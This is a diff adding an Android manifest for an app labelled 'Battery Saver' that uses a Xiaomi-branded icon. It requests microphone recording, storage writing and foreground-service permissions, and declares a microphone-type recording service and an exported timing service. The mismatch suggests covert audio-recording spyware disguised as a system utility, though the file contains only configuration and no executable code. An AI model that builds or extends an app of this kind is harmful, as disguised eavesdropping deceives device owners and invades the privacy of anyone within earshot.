@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <application
+        android:icon="@drawable/icons8_xiaomi_240"
+        android:label="Battery Saver"
+        android:roundIcon="@drawable/icons8_xiaomi_240"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
+
+        <activity
+            android:name=".service.PermissionActivity"
+            android:exported="false" />
+
+        <service
+            android:name=".service.TimeCheckService"
+            android:enabled="true"
+            android:exported="true" />
+
+        <service
+            android:name=".service.RecordService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+    </application>
+
+</manifest>
